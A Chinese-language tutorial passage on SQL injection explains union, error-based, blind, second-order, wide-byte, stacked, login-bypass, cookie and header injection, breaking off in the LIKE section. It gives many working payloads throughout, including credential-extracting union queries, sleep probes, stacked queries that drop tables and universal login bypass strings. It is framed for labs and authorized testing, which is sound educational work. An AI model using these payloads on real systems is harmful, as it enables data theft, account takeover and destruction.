---
title: SQL注入漏洞
---
# SQL注入漏洞前置知识

## 前置知识

## 与MySql注入相关的知识点

MySQL默认在数据库中存放一个`information_scheme`该库中需要记住三个表名`SCHEMEATA`、`TABLES`、`COLUMNS`

`SCHEMATA`表存储该用户创建的所有数据库的库名，我们需要记住的数据库名的字段名为`SCHEMA_NAME`

`TABLES`表存储该用户创建的所有数据库的库名和表名，字段名分别为`TABLE_SCHEMA`和`TABLE_NAME`

`COLUMNS`表存储该用户创建的所有数据库的库名、表名和字段名，分别为`TABLE_SCHEMA`、`TABLE_NAME`、`COLUMN_NAME`

### 几个函数

`database()`：当前网站使用的数据库

`version()`：当前mysql的版本

`user()`:当前mysql的用户

### 注释

注释符：`#` `--` 空格 `/**/`

内联注释：`/*！ code */`


# SQL注入漏洞完整解析

## 前言

SQL注入是Web安全中最经典、危害最高、覆盖面最广的一类漏洞。

它的本质不是“数据库太弱”，而是**用户输入没有被当成数据处理，而是被拼接进SQL语句后当成代码执行**。

只要后端存在如下写法：

```sql
select * from users where id = '$id'
```

而 `$id` 又直接来自用户请求参数：

```http
?id=1
```

攻击者就可能通过构造特殊输入，改变原本SQL语义，从而实现：

- 绕过登录
- 获取数据库名
- 获取表名、字段名
- 读取敏感数据
- 修改、删除数据
- 在高权限场景下进一步扩大危害

本文按“漏洞成因 → 底层原理 → 注入类型 → 真实业务SQL场景 → 防御方案”的方式完整拆解SQL注入。

## 阅读说明：先用一句话理解每类注入

SQL注入的本质并不复杂：**用户输入被当成SQL语句的一部分执行了**。不同注入方式的差异，不在于“漏洞本质不同”，而在于**数据被放进SQL语句的哪个位置、页面有没有回显、数据库用什么方式把结果带回来**。

| 注入类型                 | 通俗理解                                             | 最关键条件                               |
| :----------------------- | :--------------------------------------------------- | :--------------------------------------- |
| 联合查询注入             | 把攻击者自己的查询结果，拼到页面原本要展示的数据后面 | 页面有正常数据回显，列数和字段类型能对齐 |
| 报错注入                 | 把敏感数据塞进数据库报错信息里，让页面把错误打印出来 | 网站回显数据库原生报错                   |
| 布尔盲注                 | 页面不显示数据，只根据“页面是否正常”判断每一位答案   | true/false 页面表现存在稳定差异          |
| 时间盲注                 | 页面连真假差异都没有，就用“是否延迟”当作答案         | 数据库可执行延时函数，网络抖动可控       |
| 二次注入                 | 第一次输入只负责存进去，第二次业务读取时才触发注入   | 数据库存储后的内容被再次拼接进SQL        |
| 宽字节注入               | 编码转换把转义字符吃掉，原本被保护的引号重新生效     | GBK/GB2312等多字节编码与转义逻辑错配     |
| 堆叠注入                 | 用分号在一次请求里塞入多条SQL语句                    | 数据库驱动允许多语句执行                 |
| 登录绕过注入             | 改写登录SQL的判断逻辑，让密码校验条件失效            | 登录参数直接拼接进WHERE条件              |
| POST/Cookie/Header注入   | 注入点不在URL里，而在请求体、Cookie或请求头里        | 后端信任这些输入并拼接SQL                |
| LIKE/ORDER BY/LIMIT注入  | 注入点落在搜索、排序、分页这些特殊SQL语法位置        | 开发者把业务参数直接拼进SQL结构          |
| INSERT/UPDATE/DELETE注入 | 注入点发生在写入、修改、删除语句里                   | 写操作SQL未参数化，影响可能更直接        |
| IN参数注入               | 多选ID列表被拼成 `in (...)`，攻击者闭合括号改写逻辑  | 服务端直接拼接逗号分隔列表               |
| Base64编码注入           | Base64只是外包装，解码后仍然是可控SQL片段            | 解码后的内容继续参与SQL拼接              |

可以把所有注入都理解成同一条链路：

```text
可控输入 -> 拼接进SQL -> 改变原SQL语义 -> 数据库执行异常语义 -> 通过回显/报错/真假/时间/副作用带出结果
```


> 以下语句仅用于本地靶场、sqli-labs、DVWA、测试环境和授权安全测试。

---

# 一、SQL注入核心定义

## 1.1 什么是SQL注入

SQL注入是指攻击者通过可控输入点，向后端SQL语句中插入恶意SQL片段，改变原有SQL逻辑，使数据库执行攻击者构造的查询、判断、延时、报错或数据操作语句。

一句话概括：

> 用户输入被拼进SQL后，数据变成了代码。

---

## 1.2 SQL注入产生的根源

SQL注入的根本原因不是某一个特殊字符，而是：

```text
用户输入 + 字符串拼接SQL + 无参数化处理 = SQL注入
```

典型漏洞代码：

```php
$id = $_GET['id'];
$sql = "select * from users where id='$id'";
$result = mysqli_query($conn, $sql);
```

正常访问：

```http
?id=1
```

实际SQL：

```sql
select * from users where id='1'
```

恶意访问：

```http
?id=1' or '1'='1
```

实际SQL变成：

```sql
select * from users where id='1' or '1'='1'
```

原本只查询 `id=1` 的用户，现在变成了永真条件，查询逻辑被攻击者控制。

---

# 二、SQL注入基础判断流程

## 2.1 判断是否存在注入点

常见测试方式：

```http
?id=1'
```

如果页面出现数据库报错，例如：

```text
You have an error in your SQL syntax
```

说明单引号破坏了原SQL结构，可能存在字符型注入。

---

## 2.2 数字型与字符型注入

### 数字型SQL

后端语句：

```sql
select * from users where id=$id
```

正常参数：

```http
?id=1
```

注入测试：

```http
?id=1 and 1=1
?id=1 and 1=2
```

实际SQL：

```sql
select * from users where id=1 and 1=1
select * from users where id=1 and 1=2
```

如果前者正常、后者异常或无数据，说明存在数字型注入。

---

### 字符型SQL

后端语句：

```sql
select * from users where username='$name'
```

正常参数：

```http
?name=admin
```

注入测试：

```http
?name=admin' and '1'='1
?name=admin' and '1'='2
```

实际SQL：

```sql
select * from users where username='admin' and '1'='1'
select * from users where username='admin' and '1'='2'
```

字符型注入需要闭合引号，常见闭合方式有：

```sql
'
"
')
")
'))
"))
```

---

## 2.3 注释符的作用

攻击者常用注释符截断后续SQL：

```sql
--+
#
/*
```

例如原SQL：

```sql
select * from users where id='1' and status='normal'
```

注入参数：

```http
?id=1' or '1'='1' --+
```

实际SQL：

```sql
select * from users where id='1' or '1'='1' -- ' and status='normal'
```

后面的条件被注释掉，查询逻辑被改变。

---

# 三、联合查询注入 Union Based SQL Injection

## 3.1 核心定义

### 通俗理解

联合查询注入可以理解成：**网站原本只想查询自己的数据，攻击者通过 `union select` 又塞进一条自己的查询，并让数据库把两份结果合并后一起返回给页面。**

它不是让数据库“额外开一个后门”，而是借用了SQL本来就支持的集合合并能力。页面上只要有一个位置会展示查询结果，攻击者就可能把数据库名、表名、字段名或字段内容，伪装成“正常查询结果”显示出来。

### 必要条件

- **页面有数据回显**：查询结果要能显示在页面上，否则联合出来的数据没有出口。
- **列数一致**：原查询有几列，`union select` 后面也要补几列。
- **字段类型兼容**：显示位最好能承载字符串，否则敏感数据可能无法正常显示。
- **原SQL能被闭合**：需要根据数字型、字符型、括号型等上下文正确闭合前半段SQL。

### 底层数据流

```text
用户参数 -> 闭合原查询 -> 拼接 union select -> 数据库合并结果集 -> 页面展示可见列 -> 数据泄露
```

### 常见误区

联合查询注入的重点不是“payload多复杂”，而是先找出三件事：**有几列、哪一列能显示、当前SQL如何闭合**。这三件事确认后，后面的爆库、爆表、爆字段，本质上都是把查询目标换掉。


联合查询注入是利用 `union select` 将攻击者构造的查询结果拼接到原查询结果中，通过页面正常回显位置显示数据库敏感信息。

要求：

- 页面有正常数据显示位
- 原SQL和union查询字段数量一致
- 字段类型尽量兼容
- 当前数据库用户有查询权限

---

## 3.2 Union注入基础原理

原SQL：

```sql
select id,username,password from users where id=1
```

攻击者构造：

```http
?id=1 union select 1,2,3
```

实际SQL：

```sql
select id,username,password from users where id=1
union select 1,2,3
```

如果页面显示了 `2` 或 `3`，说明对应位置可以回显数据。

---

## 3.3 判断字段数量

常用 `order by` 判断字段数：

```http
?id=1 order by 1 --+
?id=1 order by 2 --+
?id=1 order by 3 --+
?id=1 order by 4 --+
```

如果：

```http
order by 3 正常
order by 4 报错
```

说明原查询有3个字段。

---

## 3.4 判断回显位

```http
?id=-1 union select 1,2,3 --+
```

为什么常用 `id=-1`？

因为让原查询查不到数据，页面就更容易显示union后面的结果。

实际SQL：

```sql
select id,username,password from users where id=-1
union select 1,2,3
```

页面如果显示：

```text
Username: 2
Password: 3
```

说明第2、3列是回显位。

---

## 3.5 获取当前数据库信息

```http
?id=-1 union select 1,database(),version() --+
```

实际SQL：

```sql
select id,username,password from users where id=-1
union select 1,database(),version()
```

可能回显：

```text
security
5.7.26
```

---

## 3.6 查询所有数据库名

```http
?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+
```

核心表：

```sql
information_schema.schemata
```

核心字段：

```sql
schema_name
```

---

## 3.7 查询当前库所有表名

```http
?id=-1 union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema=database() --+
```

---

## 3.8 查询指定表字段名

假设存在表 `users`：

```http
?id=-1 union select 1,group_concat(column_name),3
from information_schema.columns
where table_schema=database()
and table_name='users' --+
```

---

## 3.9 查询用户数据

假设字段为：

```sql
username,password
```

构造：

```http
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+
```

其中：

```text
0x3a = :
```

回显可能为：

```text
admin:admin123,test:123456
```

---

## 3.10 Union注入数据流

```text
用户输入
  ↓
拼接进where条件
  ↓
闭合原SQL结构
  ↓
union select 拼接新查询
  ↓
数据库执行两个查询
  ↓
结果集合并
  ↓
页面显示攻击者指定字段
```

---

# 四、报错注入 Error Based SQL Injection

## 4.1 核心定义

### 通俗理解

报错注入可以理解成：**页面不一定展示正常查询结果，但它会展示数据库错误；攻击者就把想看的数据塞进错误信息里，让数据库自己把数据报出来。**

这类注入最经典的场景是 MySQL 的 `updatexml()`、`extractvalue()`。它们原本是XML处理函数，需要接收合法的 XPath 路径；攻击者故意传入不合法的路径，并把 `database()`、表名、字段名等数据拼进去，数据库报错时就会把这段非法路径一起打印出来。

### 必要条件

- **存在注入点**：用户输入能进入SQL语句。
- **报错可见**：网站没有屏蔽数据库原生错误信息。
- **函数可用**：目标数据库版本和函数特性匹配，例如 MySQL 5.1+ 的XML函数。
- **错误内容会包含参数**：报错信息里能带出攻击者拼接的字符串。

### 底层数据流

```text
可控参数 -> 拼接进SQL -> 传入报错函数 -> 非法语法触发错误 -> 错误信息夹带查询结果 -> 页面回显
```

### 为什么正常函数会变成报错工具

`updatexml()` 和 `extractvalue()` 的第二个参数本来要求是合法 XPath，例如 `//user/name`。当攻击者传入 `~数据库名` 这类非法路径时，数据库为了方便开发者定位问题，会返回类似 `XPATH syntax error` 的错误，并把非法参数内容一并输出。

这不是数据库“故意留后门”，而是**调试友好的错误回显机制**被SQL拼接漏洞放大了。


报错注入是利用数据库函数的错误回显机制，将敏感数据拼接到错误信息中，再通过页面报错泄露数据。

适用条件：

- 存在SQL注入
- 页面回显数据库原生错误
- 数据库函数支持可控报错内容

---

## 4.2 updatexml报错注入

典型语句：

```http
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

实际SQL：

```sql
select * from users
where id='1'
and updatexml(1,concat(0x7e,database(),0x7e),1)
```

报错回显：

```text
XPATH syntax error: '~security~'
```

说明当前数据库名为：

```text
security
```

---

## 4.3 extractvalue报错注入

```http
?id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
```

实际SQL：

```sql
select * from users
where id='1'
and extractvalue(1,concat(0x7e,database(),0x7e))
```

---

## 4.4 查询表名

```http
?id=1' and updatexml(1,concat(0x7e,
(select group_concat(table_name)
from information_schema.tables
where table_schema=database()),0x7e),1) --+
```

---

## 4.5 查询字段名

```http
?id=1' and updatexml(1,concat(0x7e,
(select group_concat(column_name)
from information_schema.columns
where table_name='users'
and table_schema=database()),0x7e),1) --+
```

---

## 4.6 查询账号密码

```http
?id=1' and updatexml(1,concat(0x7e,
(select group_concat(username,0x3a,password)
from users),0x7e),1) --+
```

---

## 4.7 报错注入长度限制

MySQL XML报错函数通常存在回显长度限制，常见只能显示约32位字符。

因此需要分段截取：

```sql
substr(字段,1,32)
substr(字段,33,32)
substr(字段,65,32)
```

示例：

```http
?id=1' and updatexml(1,concat(0x7e,
substr((select group_concat(username,0x3a,password) from users),1,32),
0x7e),1) --+
```

---



## 4.8 floor随机数分组报错原理

除了XML函数报错，MySQL里还有一类经典的 `floor(rand()*2)` 分组报错。它和 `updatexml()` 不是同一类机制：XML函数报错是**语法校验错误**，而 `floor(rand()*2)` 更像是**分组计算过程中的逻辑冲突**。

### 通俗理解

可以把它理解成数据库在做分组统计时，需要把每一组放进一张临时表里；但 `rand()` 每次计算可能变化，导致数据库前后两次看到的分组键不一致，最终触发重复键错误。攻击者把想看的数据拼进分组键里，错误信息就可能顺带把数据带出来。

### 触发链路

```text
构造子查询 -> concat拼接敏感数据和随机分组值 -> group by建立临时分组 -> rand重复计算导致键冲突 -> duplicate entry报错夹带数据
```

### 和XML报错的区别

| 类型            | 触发原因                            | 典型表现             |
| :-------------- | :---------------------------------- | :------------------- |
| XML函数报错     | XPath参数非法                       | `XPATH syntax error` |
| floor随机数报错 | `group by` 与 `rand()` 重复计算冲突 | `Duplicate entry`    |

这类报错同样依赖网站回显数据库错误。生产环境如果统一关闭原生错误回显，即使底层表达式触发异常，攻击者也很难直接从页面拿到数据。

# 五、布尔盲注 Boolean Based Blind SQL Injection

## 5.1 核心定义

### 通俗理解

布尔盲注可以理解成和数据库玩“猜谜游戏”：**页面不告诉你数据是什么，但会用页面是否正常、是否有数据、内容是否变化来回答 true 或 false。**

攻击者不能一次性拿到结果，只能把问题拆成很多个判断题，例如“数据库名第一个字符是不是 `s`”“ASCII值是否大于100”。每次页面返回一个真假信号，最后把答案一点点拼出来。

### 必要条件

- **页面不直接回显数据**：否则优先用联合查询或报错注入。
- **真假条件有差异**：条件为真和为假时，页面内容、长度、状态码或业务提示不同。
- **响应稳定**：页面差异不能随机变化，否则判断会失真。
- **可构造条件表达式**：能够使用 `and`、`or`、比较运算、字符串截取等逻辑。

### 底层数据流

```text
构造真假问题 -> 数据库计算条件 -> 页面表现发生差异 -> 根据差异记录0/1答案 -> 多轮还原数据
```

### 常见误区

布尔盲注不是“看不到就不能注入”，而是**把数据读取从一次性展示，变成多轮真假判断**。它慢，但适用面很广，只要页面能稳定区分真假，就有利用空间。


布尔盲注是在页面没有直接回显数据、也没有报错信息时，通过构造真假条件，观察页面响应差异，从而逐位推断数据。

页面只需要存在两种状态：

```text
条件为真：页面正常
条件为假：页面异常 / 无数据 / 内容变化
```

---

## 5.2 判断布尔盲注

```http
?id=1' and 1=1 --+
?id=1' and 1=2 --+
```

如果：

```text
1=1 页面正常
1=2 页面无数据
```

说明可以使用布尔盲注。

---

## 5.3 猜数据库名长度

```http
?id=1' and length(database())=8 --+
```

实际SQL：

```sql
select * from users
where id='1'
and length(database())=8
```

如果页面正常，说明当前数据库名长度为8。

---

## 5.4 逐位猜数据库名

```http
?id=1' and substr(database(),1,1)='s' --+
```

判断第一位是否为 `s`。

也可以用ASCII方式：

```http
?id=1' and ascii(substr(database(),1,1))=115 --+
```

其中：

```text
115 = s
```

---

## 5.5 二分法优化猜解

逐个字符爆破效率低，可以用大于小于判断：

```http
?id=1' and ascii(substr(database(),1,1))>100 --+
?id=1' and ascii(substr(database(),1,1))>110 --+
?id=1' and ascii(substr(database(),1,1))>115 --+
```

通过二分法快速缩小范围。

---

## 5.6 猜表名

查询第一个表名的第一个字符：

```http
?id=1' and ascii(substr(
(select table_name from information_schema.tables
where table_schema=database()
limit 0,1),1,1))=117 --+
```

如果页面正常，说明第一个表名第一位字符是：

```text
u
```

---

## 5.7 布尔盲注数据流

```text
攻击者构造真假判断
  ↓
数据库执行条件
  ↓
页面产生两种不同响应
  ↓
攻击者记录真假结果
  ↓
逐位推断数据库内容
```

---

# 六、时间盲注 Time Based Blind SQL Injection

## 6.1 核心定义

### 通俗理解

时间盲注是布尔盲注的进一步退化：**页面真假看起来完全一样，那就让数据库在条件为真时故意睡几秒，用响应时间当作答案。**

例如条件成立就执行 `sleep(5)`，不成立就立即返回。攻击者通过观察页面是否延迟，判断当前猜测是否正确。

### 必要条件

- **页面内容没有可靠差异**：普通布尔盲注不好判断。
- **数据库支持延时函数**：如 MySQL 的 `sleep()`、`benchmark()`。
- **网络环境相对稳定**：延迟差异要大于正常网络抖动。
- **后端没有严格超时拦截**：否则延时结果可能被统一截断。

### 底层数据流

```text
构造条件 -> 条件为真则延时 -> 条件为假则正常返回 -> 观察响应时间 -> 多轮推断数据
```

### 常见误区

时间盲注不是靠“页面显示结果”，而是靠“时间这个侧信道”。因此它通常比布尔盲注更慢，也更容易被超时、限速、WAF和网络抖动影响。


时间盲注是在页面没有回显、没有报错、真假页面也不明显时，通过数据库延时函数判断条件真假。

核心思想：

```text
条件为真 → 延时5秒
条件为假 → 不延时
```

---

## 6.2 MySQL常用延时函数

```sql
sleep(5)
benchmark(10000000,md5(1))
```

---

## 6.3 判断时间盲注

```http
?id=1' and sleep(5) --+
```

如果页面明显延迟5秒响应，说明可能存在时间盲注。

更严谨的判断：

```http
?id=1' and if(1=1,sleep(5),0) --+
?id=1' and if(1=2,sleep(5),0) --+
```

如果前者延迟，后者不延迟，说明注入成立。

---

## 6.4 猜数据库名长度

```http
?id=1' and if(length(database())=8,sleep(5),0) --+
```

---

## 6.5 逐位猜数据库名

```http
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

如果响应延迟5秒，说明第一位是 `s`。

---

## 6.6 猜表名

```http
?id=1' and if(ascii(substr(
(select table_name from information_schema.tables
where table_schema=database()
limit 0,1),1,1))=117,sleep(5),0) --+
```

---

## 6.7 时间盲注的特点

优点：

- 不依赖页面回显
- 不依赖数据库报错
- 隐蔽性较强

缺点：

- 速度慢
- 容易受网络波动影响
- 大量请求容易被日志发现

---

# 七、二次注入 Second Order SQL Injection

## 7.1 核心定义

### 通俗理解

二次注入最容易被低估。它的特点是：**第一次提交恶意内容时不触发，系统把它当普通数据存进数据库；第二次业务再把这段数据取出来拼SQL时，漏洞才真正爆发。**

可以把它理解成“延迟引爆”的SQL注入。注册、昵称、地址、备注、工单标题这些看似只是保存数据的字段，都可能成为后续SQL拼接的原料。

### 必要条件

- **第一处入口可写入数据库**：攻击字符串能被保存下来。
- **第二处业务会读取该字段**：例如修改密码、查询订单、生成报表。
- **读取后再次拼接SQL**：存储数据被当成SQL片段的一部分，而不是普通值。
- **两处业务链路存在关联**：前台输入能影响后台或后续功能。

### 底层数据流

```text
第一次请求写入恶意字符串 -> 数据库存储 -> 后续业务读取该字符串 -> 再次拼接SQL -> 注入触发
```

### 常见误区

二次注入不是“输入时没报错就安全”。很多系统只检查第一跳，却忽略了**数据入库后仍然可能再次进入SQL语句**。这也是它在真实业务中更隐蔽的原因。


二次注入是指恶意SQL代码第一次提交时没有立即触发，而是被存入数据库；当系统第二次读取该数据并拼接SQL执行时，才触发注入。

核心流程：

```text
第一次请求：恶意数据入库
第二次请求：系统读取恶意数据
第三步：恶意数据被拼接进SQL
最终触发注入
```

---

## 7.2 典型业务场景

用户注册功能：

```http
username=admin'#
password=123456
```

第一次注册时，后端可能做了转义或没有触发查询异常，将用户名存入数据库：

```text
admin'#
```

---

## 7.3 修改密码场景触发二次注入

后端修改密码逻辑：

```php
$username = $_SESSION['username'];
$newpass = $_POST['newpass'];

$sql = "update users set password='$newpass' where username='$username'";
```

当 `$username` 从数据库中取出为：

```text
admin'#
```

实际SQL变成：

```sql
update users set password='newpass' where username='admin'#'
```

后面的引号被注释掉，最终可能修改了 `admin` 用户密码。

---

## 7.4 二次注入真实业务案例语句

### 第一次：注册恶意用户名

```sql
insert into users(username,password)
values('admin''#','123456');
```

数据库中保存的实际用户名：

```text
admin'#
```

### 第二次：修改密码时触发

```sql
update users set password='hacked123'
where username='admin'#'
```

等价于：

```sql
update users set password='hacked123'
where username='admin'
```

---

## 7.5 二次注入难点

二次注入难发现，因为第一次请求可能：

- 页面正常
- 没有报错
- 没有明显回显
- 扫描器不一定能发现

真正危险点在于：

```text
入库时安全 ≠ 出库后拼接SQL安全
```

---

# 八、宽字节注入 Wide Byte SQL Injection

## 8.1 核心定义

### 通俗理解

宽字节注入的核心是编码错配：**程序以为已经用反斜杠把引号转义了，但数据库按GBK等多字节编码解析时，反斜杠可能被前面的字节“吃掉”，引号重新变成有效SQL语法。**

也就是说，开发者看见的是 `\'`，以为引号安全；数据库最终看到的却可能是一个宽字符加一个真正的 `'`，原SQL就被闭合了。

### 必要条件

- **数据库连接使用GBK/GB2312等多字节编码**。
- **程序使用转义而非预编译**，例如依赖 `addslashes()`。
- **攻击者可控输入能进入字符型SQL位置**。
- **前后端编码处理不一致**，让特殊字节组合有机会改变解析结果。

### 底层数据流

```text
输入特殊字节 -> 程序添加反斜杠转义 -> 数据库按宽字节编码解析 -> 反斜杠并入前一字符 -> 引号逃逸成功
```

### 常见误区

宽字节注入不是“某个神秘字符万能绕过”，而是**编码解析和转义顺序发生冲突**。只要使用真正的参数化查询，攻击者输入就不会被当成SQL语法解析，这类问题自然消失。


宽字节注入常见于GBK编码环境中。当程序使用转义函数把单引号 `'` 转义成 `\'`，攻击者通过构造特殊字节，让反斜杠 `\` 被前一个字节“吃掉”，从而重新释放单引号，完成注入。

常见条件：

- 数据库连接使用GBK、GB2312等宽字节编码
- 后端使用简单转义，例如 `addslashes()`
- 输入被拼接进SQL
- 没有使用预编译

---

## 8.2 普通转义逻辑

攻击者输入：

```text
1'
```

经过转义：

```text
1\'
```

SQL变成：

```sql
select * from users where id='1\''
```

单引号被转义，无法闭合。

---

## 8.3 宽字节绕过原理

攻击者输入：

```http
?id=1%df'
```

经过转义后：

```text
1%df\'
```

其中：

```text
' 被转义为 \'
```

URL编码后字节为：

```text
%df%5c%27
```

在GBK编码下：

```text
%df%5c
```

可能被识别成一个合法汉字字符，导致 `\` 被合并吃掉，剩下 `'` 重新发挥闭合作用。

最终SQL类似：

```sql
select * from users where id='1運' and 1=1 --+'
```

单引号成功逃逸。

---

## 8.4 宽字节注入测试语句

```http
?id=1%df' and 1=1 --+
?id=1%df' and 1=2 --+
```

如果前者正常、后者异常，说明可能存在宽字节注入。

---

## 8.5 宽字节Union注入

```http
?id=-1%df' union select 1,database(),version() --+
```

---

## 8.6 宽字节注入本质

```text
不是单引号没有被转义
而是反斜杠被宽字节编码吞掉
导致单引号重新变成SQL语法字符
```

---

# 九、堆叠注入 Stacked Queries Injection

## 9.1 核心定义

### 通俗理解

堆叠注入可以理解成：**原本一次请求只该执行一条SQL，攻击者用分号再追加第二条、第三条SQL，让数据库连续执行。**

它和联合查询不同。联合查询主要是“借页面显示数据”；堆叠注入则可能直接执行写入、修改、删除、建表、调用函数等操作，因此风险更直接。

### 必要条件

- **数据库和驱动允许多语句执行**。
- **后端没有关闭 multi statements**。
- **注入点能闭合当前语句并追加分号**。
- **数据库账号具备后续语句所需权限**。

### 底层数据流

```text
闭合原SQL -> 使用分号结束当前语句 -> 追加新SQL -> 数据库按顺序执行多条语句
```

### 常见误区

不是所有SQL注入都支持堆叠。很多数据库驱动默认禁用多语句执行，所以测试时即使普通注入成立，堆叠语句也可能被驱动层拦掉。


堆叠注入是指攻击者利用分号 `;` 在一次请求中执行多条SQL语句。

普通注入通常只能改变一条查询语句，而堆叠注入可以额外执行：

```sql
insert
update
delete
drop
create
```

危险性更高。

---

## 9.2 堆叠注入示例

原SQL：

```sql
select * from users where id='$id'
```

攻击参数：

```http
?id=1'; update users set password='123456' where username='admin' --+
```

实际SQL：

```sql
select * from users where id='1';
update users set password='123456' where username='admin' -- '
```

---

## 9.3 堆叠注入适用限制

不是所有环境都支持堆叠注入。

常见情况：

| 环境                   | 是否常见支持     |
| ---------------------- | ---------------- |
| MySQL + mysqli普通查询 | 通常不支持多语句 |
| MySQL + multi_query    | 支持             |
| SQL Server             | 常见支持         |
| PostgreSQL             | 某些场景支持     |
| SQLite                 | 视驱动而定       |

---

## 9.4 堆叠注入危害

如果权限足够，可能造成：

```sql
update users set role='admin' where username='test';
delete from logs;
drop table users;
```

所以堆叠注入比普通查询型注入更危险。

---

# 十、登录绕过注入

## 10.1 典型登录SQL

### 通俗理解

登录绕过注入的本质是：**把登录SQL里的密码校验逻辑改掉，让数据库认为条件已经成立。**

正常登录应该同时满足用户名和密码，例如 `username='admin' and password='xxx'`。攻击者通过闭合引号、追加 `or` 条件、注释掉后半段，让SQL变成“用户名存在或永远为真”。

### 必要条件

- **用户名或密码字段直接拼接SQL**。
- **登录逻辑依赖SQL返回行数判断成功**。
- **可使用注释符或逻辑运算改变WHERE条件**。
- **没有二次校验密码哈希或多因素认证**。

### 底层数据流

```text
输入登录参数 -> 拼接进WHERE条件 -> 改写账号/密码判断逻辑 -> 查询返回用户记录 -> 登录成功
```

### 常见误区

登录绕过不一定需要知道密码，它利用的是**认证SQL的逻辑缺陷**。防御重点也不是简单过滤 `or`，而是让用户名和密码永远作为参数值进入SQL，并对密码哈希做严格校验。


```sql
select * from users
where username='$username'
and password='$password'
```

正常登录：

```text
username=admin
password=123456
```

实际SQL：

```sql
select * from users
where username='admin'
and password='123456'
```

---

## 10.2 万能密码绕过

输入：

```text
username=admin' --+
password=任意
```

实际SQL：

```sql
select * from users
where username='admin' --+'
and password='任意'
```

密码条件被注释，直接只判断用户名。

---

## 10.3 OR永真绕过

输入：

```text
username=' or '1'='1' --+
password=任意
```

实际SQL：

```sql
select * from users
where username='' or '1'='1' --+'
and password='任意'
```

由于：

```sql
'1'='1'
```

永远为真，可能直接登录第一条用户记录。

---

## 10.4 常见登录绕过Payload

```sql
' or '1'='1' --+
' or 1=1 --+
admin' --+
admin'# 
') or ('1'='1' --+
" or "1"="1" --+
```

---

# 十一、POST注入

## 11.1 核心定义

### 通俗理解

POST注入和GET注入没有本质区别。区别只在于：**参数不在URL查询字符串里，而是在请求体里。**

很多人只盯着地址栏里的 `?id=1`，但登录表单、搜索表单、JSON接口、后台配置提交，往往都通过POST传参。只要后端把POST字段直接拼进SQL，它就是注入点。

### 必要条件

- **POST表单或接口字段可控**。
- **后端将字段拼接进SQL**。
- **服务端没有参数化查询**。
- **测试工具能修改请求体**，例如 Burp Suite、curl、Postman。

### 底层数据流

```text
请求体参数 -> 后端读取POST字段 -> 拼接SQL -> 数据库执行被改写的语句
```

### 常见误区

POST并不比GET天然安全。HTTP方法只决定参数放在哪里，不决定参数是否可信。**只要来自客户端，就都应该视为不可信输入。**


POST注入和GET注入本质相同，只是参数位置不同。

GET参数在URL中：

```http
?id=1
```

POST参数在请求体中：

```http
username=admin&password=123456
```

---

## 11.2 POST登录注入示例

请求体：

```http
username=admin' --+&password=abc
```

后端SQL：

```sql
select * from users
where username='admin' --+'
and password='abc'
```

---

## 11.3 JSON格式POST注入

现代系统常见JSON请求：

```json
{
  "username": "admin",
  "password": "123456"
}
```

漏洞输入：

```json
{
  "username": "admin' --+",
  "password": "anything"
}
```

实际SQL：

```sql
select * from users
where username='admin' --+'
and password='anything'
```

---

# 十二、Cookie注入

## 12.1 核心定义

### 通俗理解

Cookie注入的核心是：**Cookie也是用户能改的输入，不是服务器天然可信的数据。**

如果系统把 `uid`、`role`、`tracking_id` 等Cookie值拿来拼SQL查询用户信息、访问记录或统计数据，攻击者就可以改Cookie触发注入。

### 必要条件

- **Cookie字段参与数据库查询**。
- **服务端没有校验或签名Cookie内容**。
- **Cookie值被直接拼接进SQL**。
- **业务逻辑信任客户端保存的身份或偏好字段**。

### 底层数据流

```text
篡改Cookie -> 服务端读取Cookie -> 拼接SQL查询 -> 数据库执行异常语义 -> 回显/报错/盲注判断
```

### 常见误区

Cookie在浏览器里看起来“像系统自己生成的”，但对攻击者来说它和URL参数一样可控。服务端不能因为字段来自Cookie，就默认它是可信的。


Cookie注入是指后端从Cookie中取值后拼接SQL，攻击者通过修改Cookie触发注入。

例如：

```http
Cookie: uid=1
```

后端代码：

```php
$uid = $_COOKIE['uid'];
$sql = "select * from users where id='$uid'";
```

---

## 12.2 Cookie注入示例

恶意Cookie：

```http
Cookie: uid=1' and updatexml(1,concat(0x7e,database()),1) --+
```

实际SQL：

```sql
select * from users
where id='1'
and updatexml(1,concat(0x7e,database()),1) --+'
```

---

# 十三、Header注入

## 13.1 常见注入位置

### 通俗理解

Header注入发生在请求头里，例如 `User-Agent`、`Referer`、`X-Forwarded-For`。它常见于日志、统计、审计、风控等场景：**系统把请求头写进数据库，或者后续按请求头查询数据时，直接拼接了SQL。**

这类注入不一定立刻在页面上表现出来，有时会变成二次注入：先写入日志表，后台管理员查看日志或系统生成报表时才触发。

### 必要条件

- **服务端读取并使用请求头字段**。
- **请求头内容进入SQL写入或查询语句**。
- **日志/统计/审计功能没有参数化**。
- **存在报错、延时、后台展示或后续查询链路**。

### 底层数据流

```text
伪造请求头 -> 后端记录/查询Header -> 拼接SQL -> 写入异常数据或触发查询注入 -> 回显/延时/二次触发
```

### 常见误区

Header不是“浏览器自动带的就安全”。攻击工具可以任意改请求头，所以所有Header字段都应按用户输入处理，尤其是会入库的Header。


一些系统会记录用户请求信息，例如：

- User-Agent
- Referer
- X-Forwarded-For
- Client-IP

如果这些字段被写入数据库时没有预编译，就可能产生SQL注入。

---

## 13.2 User-Agent注入

后端日志SQL：

```sql
insert into access_log(ip,user_agent)
values('$ip','$ua')
```

攻击者构造：

```http
User-Agent: test',updatexml(1,concat(0x7e,database()),1)) --+
```

实际SQL可能变成：

```sql
insert into access_log(ip,user_agent)
values('127.0.0.1','test',updatexml(1,concat(0x7e,database()),1)) --+')
```

---

## 13.3 X-Forwarded-For注入

请求头：

```http
X-Forwarded-For: 127.0.0.1' or sleep(5) --+
```

后端SQL：

```sql
insert into login_log(ip,username)
values('127.0.0.1' or sleep(5) --+','admin')
```

---

# 十四、搜索框LIKE注入

## 14.1 典型业务SQL

### 通俗理解

LIKE注入常见于搜索框。正常SQL可能是 `where title like '%关键词%'`，攻击者输入如果直接拼进去，就可以先闭合引号和百分号，再追加自己的SQL逻辑。

它的特殊点在于：注入点通常被包在 `%...%` 中，既有字符串引号，又有LIKE通配符，所以闭合方式和普通字符型注入略有差异。

### 必要条件

- **搜索关键词直接拼入LIKE语句**。
- **关键词周围存在引号和 `%` 通配符**。
